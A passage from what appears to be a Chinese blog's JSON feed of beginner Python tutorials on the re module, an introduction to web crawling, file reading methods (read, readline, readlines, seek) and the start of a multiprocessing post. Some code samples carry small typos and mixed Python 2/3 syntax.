style=\"text-align:right\">将所有匹配到的项生成一个迭代器</td>\n<td style=\"text-align:right\">所有匹配到的字符串组合成的迭代器</td>\n</tr>\n<tr>\n<td style=\"text-align:right\">subn(pat,repl, string[,count=0,flags])</td>\n<td style=\"text-align:right\">在替换字符串后，同时报告替换的次数</td>\n<td style=\"text-align:right\">完成替换后的新字符串及替换次数</td>\n</tr>\n<tr>\n<td style=\"text-align:right\">escape（string）</td>\n<td style=\"text-align:right\">将字符串中所有特殊正则表达式字符串转义</td>\n<td style=\"text-align:right\">转义后的字符串</td>\n</tr>\n<tr>\n<td style=\"text-align:right\">purge(pattern)</td>\n<td style=\"text-align:right\">清空正则表达式</td>\n</tr>\n<tr>\n<td style=\"text-align:right\">template(pattern[,flags])</td>\n<td style=\"text-align:right\">编译一个匹配模板</td>\n<td style=\"text-align:right\">模式对象</td>\n</tr>\n<tr>\n<td style=\"text-align:right\">fullmatch(pattern, string[, flags])</td>\n<td style=\"text-align:right\">match 方法的全字符串匹配版本</td>\n<td style=\"text-align:right\">类似 match 的返回值</td>\n</tr>\n</tbody>\n</table>\n<p>同时还定义了下面几种匹配模式，单个大写字母是缩写，单词是完整模式名称，引用方法为 re.A 或者 re.ASCII，两者都可以，注意全部是大写：</p>\n<pre><code>A  ：ASCII       \nI  ：IGNORECASE  \nL  ：LOCALE      \nM  ：MULTILINE  \nS  ：DOTALL      \nX  ：VERBOSE    \nU  ：UNICODE\n</code></pre>\n<h2 id=\"三大搜索函数\"><a class=\"anchor\" href=\"#三大搜索函数\">#</a> 三大搜索函数</h2>\n<p>match(pattern, string, flags=0)<br />\n match () 方法会在给定字符串的开头进行匹配，如果匹配不成功则返回 None，匹配成功返回一个匹配对象，这个对象有个 group () 方法，可以将匹配到的字符串给出。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> ret <span class=\"token operator\">=</span> re<span class=\"token punctuation\">.</span>match<span class=\"token punctuation\">(</span><span class=\"token string\">r\"abc\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"ab1c123\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>ret<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token boolean\">None</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> re<span class=\"token punctuation\">.</span>match<span class=\"token punctuation\">(</span><span class=\"token string\">r\"abc\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"abc123\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token operator\">&lt;</span>_sre<span class=\"token punctuation\">.</span>SRE_Match <span class=\"token builtin\">object</span><span class=\"token punctuation\">;</span> span<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> match<span class=\"token operator\">=</span><span class=\"token string\">'abc'</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> obj <span class=\"token operator\">=</span> re<span class=\"token punctuation\">.</span>match<span class=\"token punctuation\">(</span><span class=\"token string\">r\"abc\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"abc123\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> obj<span class=\"token punctuation\">.</span>group<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token string\">'abc'</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>对于一个&lt;_sre.SRE_Match object; span=(0, 3), match='abc'>对象，span指的是匹配到的字符在字符串中的位置下标，</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>分别对应start和end。需要注意的是不包括end位置的下标，它是右开口的。具体如下：</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> obj <span class=\"token operator\">=</span> re<span class=\"token punctuation\">.</span>match<span class=\"token punctuation\">(</span><span class=\"token string\">r\"abc\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"abc123\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> obj<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> obj<span class=\"token punctuation\">.</span>end<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> obj<span class=\"token punctuation\">.</span>span<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> obj<span class=\"token punctuation\">.</span>group<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token string\">'abc'</span></pre></td></tr></table></figure><p>search(pattern, string, flags=0)<br />\n 在文本内查找，返回第一个匹配到的字符串。它的返回值类型和使用方法与 match () 是一样的，唯一的区别就是查找的位置不用固定在文本的开头。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> obj <span class=\"token operator\">=</span> re<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span><span class=\"token string\">r\"abc\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"123abc456abc789\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> obj</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">&lt;</span>_sre<span class=\"token punctuation\">.</span>SRE_Match <span class=\"token builtin\">object</span><span class=\"token punctuation\">;</span> span<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> match<span class=\"token operator\">=</span><span class=\"token string\">'abc'</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> obj<span class=\"token punctuation\">.</span>group<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token string\">'abc'</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> obj<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> obj<span class=\"token punctuation\">.</span>end<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token number\">6</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> obj<span class=\"token punctuation\">.</span>span<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>findall(pattern, string, flags=0)<br />\n 作为 re 模块的三大搜索函数之一，findall () 和 match ()、search () 的不同之处在于，前两者都是单值匹配，找到一个就忽略后面，直接返回不再查找了。而 findall 是全文查找，它的返回值是一个匹配到的字符串的列表。这个列表没有 group () 方法，没有 start、end、span，更不是一个匹配对象，仅仅是个列表！如果一项都没有匹配到那么返回一个空列表。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> obj <span class=\"token operator\">=</span> re<span class=\"token punctuation\">.</span>findall<span class=\"token punctuation\">(</span><span class=\"token string\">r\"abc\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"123abc456abc789\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> obj</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token string\">'abc'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'abc'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> obj<span class=\"token punctuation\">.</span>group<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>Traceback <span class=\"token punctuation\">(</span>most recent call last<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  File <span class=\"token string\">\"&lt;pyshell#37>\"</span><span class=\"token punctuation\">,</span> line <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">in</span> <span class=\"token operator\">&lt;</span>module<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    obj<span class=\"token punctuation\">.</span>group<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>AttributeError<span class=\"token punctuation\">:</span> <span class=\"token string\">'list'</span> <span class=\"token builtin\">object</span> has no attribute <span class=\"token string\">'group'</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> obj <span class=\"token operator\">=</span> re<span class=\"token punctuation\">.</span>findall<span class=\"token punctuation\">(</span><span class=\"token string\">r\"ABC\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"123abc456abc789\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr></table></figure><h1 id=\"python爬虫\"><a class=\"anchor\" href=\"#python爬虫\">#</a> Python 爬虫</h1>\n<h2 id=\"介绍\"><a class=\"anchor\" href=\"#介绍\">#</a> 介绍</h2>\n<p>什么是爬虫<br />\n爬虫：一段自动抓取互联网信息的程序，从互联网上抓取对于我们有价值的信息</p>\n<p>数据抓取（也称为网络数据提取或网页爬取）是指从网上获取数据，并将获取到的数据转化为结构化的数据，最终可以将数据存储到本地计算机或数据库的一种技术～</p>\n<p>Python 是一门非常适合开发网络爬虫的编程语言，提供了如 urllib、re、requests、json、pyquery 等模块，同时又有很多成型框架，如 Scrapy 框架、PySpider 爬虫系统等。</p>\n<h2 id=\"url\"><a class=\"anchor\" href=\"#url\">#</a> URL</h2>\n<p>URL 的全称统一资源定位符 (Uniform Resource Locator) 是对可以从互联网上得到的资源的位置和访问方法的一种简洁的表示，是互联网上标准资源的地址。互联网上的每个文件都有一个唯一的 URL，它包含的信息指出文件的位置以及浏览器应该怎么处理它。</p>\n<h2 id=\"模块\"><a class=\"anchor\" href=\"#模块\">#</a> 模块</h2>\n<p>Python 3.x 版本后的 urllib 和 urllib2</p>\n<p>在 Python 3 以后的版本中，urllib2 这个模块已经不单独存在（也就是说当你 import urllib2 时，系统提示你没这个模块），urllib2 被合并到了 urllib 中，叫做 urllib.request 和 urllib.error 。</p>\n<h1 id=\"思维导图\"><a class=\"anchor\" href=\"#思维导图\">#</a> 思维导图</h1>\n<p>右键新标签打开<br />\n<img data-src=\"Python%20%E7%9F%A5%E8%AF%86%E7%82%B9.jpg\" alt=\"\" /></p>\n<h1 id=\"总结\"><a class=\"anchor\" href=\"#总结\">#</a> 总结</h1>\n<p>精力有限，只能总结这么多了。</p>\n<p>复习这么多考试肯定没问题了 (ಥ_ಥ) 。</p>\n<p>这一次总结确实收获不少，充分认识了自己的不足，还有很多需要学习的方面，有机会读读《Python 网络编程基础》这本书，觉得会对学习 web 安全有很大的帮助。</p>\n<h1 id=\"收集自以下\"><a class=\"anchor\" href=\"#收集自以下\">#</a> 收集自以下</h1>\n<p>很多链接都放在文章中了</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGl1amlhbmdibG9nLmNvbS9jb3Vyc2UvcHl0aG9uLw==\">https://www.liujiangblog.com/course/python/</span><br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8xNDkyNDc1MzM=\">https://zhuanlan.zhihu.com/p/149247533</span><br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGlhb3h1ZWZlbmcuY29tL3dpa2kvMTAxNjk1OTY2MzYwMjQwMA==\">https://www.liaoxuefeng.com/wiki/1016959663602400</span><br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vZmF0MzkvcC83MTU5ODgxLmh0bWw=\">https://www.cnblogs.com/fat39/p/7159881.html</span></p>\n",
            "tags": [
                "python"
            ]
        },
        {
            "id": "https://or0kit.github.io/Programming/Python/Python%E4%B8%ADread-%E3%80%81readline-%E5%92%8Creadlines-%E4%B8%89%E8%80%85%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB%E5%92%8C%E7%94%A8%E6%B3%95/",
            "url": "https://or0kit.github.io/Programming/Python/Python%E4%B8%ADread-%E3%80%81readline-%E5%92%8Creadlines-%E4%B8%89%E8%80%85%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB%E5%92%8C%E7%94%A8%E6%B3%95/",
            "title": "Python中read()、readline()和readlines()三者间的区别和用法",
            "date_published": "2020-12-07T00:32:01.000Z",
            "content_html": "<h1 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h1>\n<blockquote>\n<p>源自<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20veXVuMTEwOC9wLzg5NjczMzQuaHRtbA==\"> https://www.cnblogs.com/yun1108/p/8967334.html</span></p>\n</blockquote>\n<p>众所周知在 python 中读取文件常用的三种方法：read (),readline (),readlines ()，今天看项目是又忘记他们的区别了。以前看书的时候觉得这东西很简单，一眼扫过，待到用时却也只知道有这么几个方法，不懂得它的原理与用法。也许吧，没有永远的记忆，况且根本没有用心去记它。话不多说，来一起看看详细的介绍：</p>\n<p>假设 a.txt</p>\n<h1 id=\"一-readsize方法\"><a class=\"anchor\" href=\"#一-readsize方法\">#</a> 一、read ([size]) 方法</h1>\n<p>read ([size]) 方法从文件当前位置起读取 size 个字节，若无参数 size，则表示读取至文件结束为止，它范围为字符串对象</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>f <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"a.txt\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>lines <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">print</span> lines</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span>lines<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>f<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>输出结果：</pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>Hello</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>Welcome</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>What <span class=\"token keyword\">is</span> the fuck<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'str'</span><span class=\"token operator\">></span> <span class=\"token comment\">#字符串类型</span></pre></td></tr></table></figure><h1 id=\"二-readline方法\"><a class=\"anchor\" href=\"#二-readline方法\">#</a> 二、readline () 方法</h1>\n<p>从字面意思可以看出，该方法每次读出一行内容，所以，读取时占用内存小，比较适合大文件，该方法返回一个字符串对象。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>f <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"a.txt\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>line <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>readline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span>line<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">while</span> line<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre> <span class=\"token keyword\">print</span> line<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre> line <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>readline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>f<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>输出结果：</pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'str'</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>Hello</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>Welcome</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>What <span class=\"token keyword\">is</span> the fuck<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr></table></figure><h1 id=\"三-readlines\"><a class=\"anchor\" href=\"#三-readlines\">#</a> 三、readlines ()</h1>\n<p>readlines () 方法读取整个文件所有行，保存在一个列表 (list) 变量中，每行作为一个元素，但读取大文件会比较占内存</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>f <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"a.txt\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>lines <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>readlines<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span>lines<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">for</span> line <span class=\"token keyword\">in</span> lines<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre> <span class=\"token keyword\">print</span> line，</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>f<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>输出结果：</pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token number\">1</span> <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'list'</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token number\">2</span> Hello</pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token number\">3</span> Welcome</pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token number\">4</span> What <span class=\"token keyword\">is</span> the fuck<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr></table></figure><h1 id=\"四-linecache模块\"><a class=\"anchor\" href=\"#四-linecache模块\">#</a> 四、linecache 模块</h1>\n<p>当然，有特殊需求还可以用 linecache 模块，比如你要输出某个文件的第 n 行：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 输出第 2 行</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>text <span class=\"token operator\">=</span> linecache<span class=\"token punctuation\">.</span>getline<span class=\"token punctuation\">(</span>‘a<span class=\"token punctuation\">.</span>txt'<span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">print</span> text<span class=\"token punctuation\">,</span></pre></td></tr></table></figure><h1 id=\"python-file-seek-方法\"><a class=\"anchor\" href=\"#python-file-seek-方法\">#</a> Python File seek () 方法</h1>\n<p>seek () 方法用于移动文件读取指针到指定位置。</p>\n<h2 id=\"语法\"><a class=\"anchor\" href=\"#语法\">#</a> 语法</h2>\n<p>seek () 方法语法如下：<br />\n <code>fileObject.seek(offset[, whence])</code></p>\n<h2 id=\"参数\"><a class=\"anchor\" href=\"#参数\">#</a> 参数</h2>\n<p>offset -- 开始的偏移量，也就是代表需要移动偏移的字节数</p>\n<ul>\n<li>whence：可选，默认值为 0。</li>\n<li>给 offset 参数一个定义，表示要从哪个位置开始偏移；0 代表从文件开头开始算起，1 代表从当前位置开始算起，2 代表从文件末尾算起。</li>\n</ul>\n<h2 id=\"返回值\"><a class=\"anchor\" href=\"#返回值\">#</a> 返回值</h2>\n<p>如果操作成功，则返回新的文件位置，如果操作失败，则函数返回 -1。</p>\n<h2 id=\"实例\"><a class=\"anchor\" href=\"#实例\">#</a> 实例</h2>\n<p>文件 runoob.txt 的内容如下：</p>\n<pre><code>1:www.runoob.com\n2:www.runoob.com\n3:www.runoob.com\n4:www.runoob.com\n5:www.runoob.com\n</code></pre>\n<p>循环读取文件的内容：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 打开文件</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>fo <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"runoob.txt\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"rw+\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">print</span> <span class=\"token string\">\"文件名为: \"</span><span class=\"token punctuation\">,</span> fo<span class=\"token punctuation\">.</span>name</pre></td></tr><tr><td data-num=\"4\"></td><td><pre> </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>line <span class=\"token operator\">=</span> fo<span class=\"token punctuation\">.</span>readline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">print</span> <span class=\"token string\">\"读取的数据为: %s\"</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>line<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre> </pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># 重新设置文件读取指针到开头</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>fo<span class=\"token punctuation\">.</span>seek<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>line <span class=\"token operator\">=</span> fo<span class=\"token punctuation\">.</span>readline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">print</span> <span class=\"token string\">\"读取的数据为: %s\"</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>line<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre> </pre></td></tr><tr><td data-num=\"13\"></td><td><pre> </pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\"># 关闭文件</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>fo<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>以上实例输出结果为：</p>\n<pre><code>文件名为:  runoob.txt\n读取的数据为: 1:www.runoob.com\n\n读取的数据为: 1:www.runoob.com\n</code></pre>\n",
            "tags": [
                "python文件读取"
            ]
        },
        {
            "id": "https://or0kit.github.io/Programming/Python/python%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/",
            "url": "https://or0kit.github.io/Programming/Python/python%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/",
            "title": "python进程线程",
            "date_published": "2020-12-02T02:06:57.000Z",
            "content_html": "<h1 id=\"多进程\"><a class=\"anchor\" href=\"#多进程\">#</a> 多进程</h1>\n<p>multiprocessing 库</p>\n<h2 id=\"导入方法\"><a class=\"anchor\" href=\"#导入方法\">#</a> 导入方法</h2>\n<p>import mutiprocessing from Process</p>\n<h2 id=\"代码\"><a class=\"anchor\" href=\"#代码\">#</a> 代码</h2>\n<h3 id=\"1-process01\"><a class=\"anchor\" href=\"#1-process01\">#</a> 1. process01</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>生活中，你可能一边听歌，一边写作业；一边上网，一边吃饭。。。这些都是生活中的多任务场景。电脑也可以执行多任务，比如你可以同时打开浏览器上网，听音乐，打开pycharm编写代码...。简单的说**多任务就是同一时间内运行多个程序**</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>- 单核CPU实现多任务原理：操作系统轮流让各个任务交替执行，QQ执行2us，切换到微信，在执行2us，再切换到陌陌，执行2us……。表面是看，每个任务反复执行下去，但是CPU调度执行速度太快了，导致我们感觉就行所有任务都在同时执行一样</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>- 多核CPU实现多任务原理：真正的秉性执行多任务只能在多核CPU上实现，但是由于任务数量远远多于CPU的核心数量，所以，操作西永也会自动把很多任务轮流调度到每个核心上执行</pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>- 并发和并行</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  - **并发**：当有多个线程在操作时,如果系统只有一个CPU,则它根本不可能真正同时进行一个以上的线程，它只能把CPU运行时间划分成若干个时间段,再将时间 段分配给各个线程执行，在一个时间段的线程代码运行时，其它线程处于挂起状。.这种方式我们称之为并发(Concurrent)。</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  - **并行**：当系统有一个以上CPU时,则线程的操作有可能非并发。当一个CPU执行一个线程时，另一个CPU可以执行另一个线程，两个线程互不抢占CPU资源，可以同时进行，这种方式我们称之为并行(Parallel)。</pre></td></tr><tr><td 